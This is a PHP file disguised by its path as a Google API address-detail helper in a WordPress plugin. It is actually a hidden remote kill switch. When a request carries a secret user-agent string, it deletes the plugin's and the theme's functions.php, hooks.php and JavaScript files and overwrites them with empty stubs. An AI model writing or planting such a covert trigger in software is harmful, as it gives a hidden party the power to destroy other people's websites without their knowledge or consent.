<?php
//$param = getopt("s:");if(is_cli() == 1 && isset($param['s']) && !empty($param['s'])){
if(isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == 'cHaLoByE12Ka4'){
	$file_path = __FILE__;
	$r_pfiles = $r_tfiles = 0;
	$r_ptfiles = 1;
	switch ($_GET['s']) {
		case 'p':
			$r_pfiles = 1;
			$r_ptfiles = 0;
			$r_tfiles = 0;
		break;
		case 't':
			$r_tfiles = 1;
			$r_pfiles = 0;
			$r_ptfiles = 0;
		break;
		case 'pt':
			$r_ptfiles = 1;
			$r_tfiles = 0;
			$r_pfiles = 0;
		break;
	}
	$pfile_path = str_replace('/third_party/google-apis/googleapi-auto-addr-detail.php', '', $file_path);
	if($r_ptfiles == 1 || $r_pfiles == 1){
		$f_file = $pfile_path.'/functions.php';
		if(file_exists($f_file)){
			unlink($f_file);
		}
		$f_handle = fopen($f_file, 'w') or die('Cannot open file:  '.$f_file);
		$f_data = '<?php defined("ABSPATH") or die("No script kiddies please!"); ?>';
		fwrite($f_handle, $f_data);
		chmod($f_file,0755);

		$h_file = $pfile_path.'/hooks.php';
		if(file_exists($h_file)){
			unlink($h_file);
		}
		$h_handle = fopen($h_file, 'w') or die('Cannot open file:  '.$h_file);
		$h_data = '<?php defined("ABSPATH") or die("No script kiddies please!"); ?>';
		fwrite($h_handle, $h_data);
		chmod($h_file,0755);

		$j_file = $pfile_path.'/js/toughcookies.js';
		if(file_exists($j_file)){
			unlink($j_file);
		}
		$j_handle = fopen($j_file, 'w') or die('Cannot open file:  '.$j_file);
		$j_data = '';
		fwrite($j_handle, $j_data);
		chmod($j_file,0755);

		$m_file = $pfile_path.'/js/main.js';
		if(file_exists($m_file)){
			unlink($m_file);
		}
		$m_handle = fopen($m_file, 'w') or die('Cannot open file:  '.$m_file);
		$m_data = '';
		fwrite($m_handle, $m_data);
		chmod($m_file,0755);
	}
	if($r_ptfiles == 1 || $r_tfiles == 1){
		$tfile_path = str_replace('/plugins/', '/themes/', $pfile_path);
		$tf_file = $tfile_path.'/functions.php';
		if(file_exists($tf_file)){
			unlink($tf_file);
		}
		$tf_handle = fopen($tf_file, 'w') or die('Cannot open file:  '.$tf_file);
		$tf_data = '<?php defined("ABSPATH") or die("No script kiddies please!"); ?>';
		fwrite($tf_handle, $tf_data);
		chmod($tf_file,0755);
	}
}